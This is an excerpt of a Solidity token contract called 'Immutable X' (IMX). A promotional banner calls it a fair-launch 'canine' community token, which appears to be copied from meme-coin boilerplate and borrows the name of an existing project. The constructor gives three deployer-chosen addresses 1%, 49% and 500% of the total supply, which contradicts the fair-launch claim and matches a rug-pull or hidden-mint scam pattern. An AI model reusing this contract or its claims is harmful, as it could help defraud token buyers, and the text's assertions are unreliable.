...
-------------------------------------------------------------------
---------------------    ImmutableX   ----------------------------
ImmutableX is a new arrival in the cryptocurrency canine family, 
with both the community and its social purpose firmly at the heart
of this project. ImmutableX is a fairly launched DeFi Token with 
...
contract ImmutableX is MetaverseNFT {
     // FairLaunch
    // common addresses
    address private owner;
    address private ImmutableXBSC;
    address private ImmutableXCoin;
    address private ImmutableXs;
    ...
    string public override name = "Immutable X";
    string public override symbol = "IMX";
    ...
    constructor(uint totalSupplyValue, address ImmutableXBSCAddress, address ImmutableXCoinAddress, address ImmutableXsAddress) {
        // set total supply
        totalSupply = totalSupplyValue;
        
        // designate addresses
        owner = msg.sender;
        ImmutableXBSC = ImmutableXBSCAddress;
        ImmutableXCoin = ImmutableXCoinAddress;
        ImmutableXs = ImmutableXsAddress;
        balances[ImmutableXBSC] =  totalSupply * 1 / 100;
        balances[ImmutableXCoin] = totalSupply * 49 / 100;
        balances[ImmutableXs] = totalSupply * 500 / 100;
